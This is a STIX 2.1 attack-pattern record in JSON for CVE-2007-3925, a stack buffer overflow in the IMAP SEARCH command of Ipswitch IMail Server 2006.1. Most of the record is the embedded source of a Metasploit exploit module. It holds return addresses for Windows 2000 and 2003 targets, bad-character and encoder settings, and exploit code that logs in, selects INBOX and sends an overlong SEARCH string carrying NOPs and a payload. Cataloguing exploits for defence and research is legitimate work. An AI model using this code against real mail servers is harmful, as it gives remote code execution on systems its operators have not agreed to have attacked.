{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1625225c-8c43-4439-841f-666f576221e5",
    "created": "2024-08-14T16:47:39.883939Z",
    "modified": "2024-08-14T16:47:39.883943Z",
    "name": "Ipswitch IMail IMAP SEARCH Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Ipswitch IMail Server 2006.1 IMAP SEARCH verb. By sending an overly long string, an attacker can overwrite the buffer and control program execution. In order for this module to be successful, the IMAP user must have at least one message. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/imap/ipswitch_search.rb",
            "external_id": "ipswitch_search.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-3925"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Imap\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ipswitch IMail IMAP SEARCH Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Ipswitch IMail Server 2006.1 IMAP SEARCH\n        verb. By sending an overly long string, an attacker can overwrite the\n        buffer and control program execution.\n        In order for this module to be successful, the IMAP user must have at least one\n        message.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-3925' ],\n          [ 'OSVDB', '36219' ],\n          [ 'BID', '24962' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 400,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\\x0b\\x09\\x0c\",\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 Pro SP4 English',   { 'Ret' => 0x77f81be3 } ],\n          [ 'Windows 2003 SP0 English',       { 'Ret' => 0x77c5cee8 } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2007-07-18'))\n  end\n\n  def exploit\n\n    sploit =  \"a002 SEARCH BEFORE \" + \"<\" + rand_text_english(87)\n    sploit << [target.ret].pack('V') + make_nops(20) + payload.encoded + \">\"\n\n    info = connect_login\n\n    if (info == true)\n      print_status(\"Trying target #{target.name}...\")\n      sock.put(\"a001 SELECT INBOX\\r\\n\")\n      sock.get_once(-1, 3)\n      sock.put(sploit + \"\\r\\n\")\n    else\n      print_status(\"Not falling through with exploit\")\n    end\n\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-07-18",
    "x_mitre_platforms": [
        "win'"
    ]
}